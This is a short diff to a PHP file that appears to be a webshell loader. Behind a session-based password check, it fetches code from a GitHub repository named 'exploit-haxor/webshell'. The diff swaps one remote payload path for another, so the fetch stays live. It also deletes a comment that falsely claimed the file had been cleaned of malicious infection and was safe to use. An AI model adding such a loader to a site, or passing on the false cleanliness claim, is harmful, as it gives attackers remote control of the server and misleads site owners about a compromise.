@@ -11,10 +11,6 @@ if (!isset($_SESSION[md5($password)])) {
         exit;
     }
 }
-$sa = file_get_contents('https://raw.githubusercontent.com/exploit-haxor/webshell/main/bypas.php.jpg');
+$sa = file_get_contents('https://raw.githubusercontent.com/exploit-haxor/webshell/main/template.php');
 
-/**
-* Note: This file may contain artifacts of previous malicious infection.
-* However, the dangerous code has been removed, and the file is now safe to use.
-*/
-
+?>
